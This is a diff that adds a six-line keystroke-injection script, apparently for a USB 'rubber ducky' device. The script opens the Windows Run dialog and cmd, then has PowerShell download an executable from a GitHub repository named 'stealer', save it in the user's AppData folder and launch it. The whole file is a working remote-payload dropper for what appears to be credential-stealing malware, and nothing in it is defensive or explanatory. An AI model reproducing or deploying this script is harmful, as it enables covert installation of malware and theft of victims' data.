@@ -1,0 +1,6 @@
+GUI r
+STRING cmd
+ENTER
+DELAY 3000
+STRING Powershell.exe -command wget "https://github.com/lino-build/stealer/raw/main/Nouveau%20dossier.exe" -OutFile ".\AppData\Local\Nouveau%20dossier.exe" | start .\AppData\Local\Nouveau%20dossier.exe | exit
+
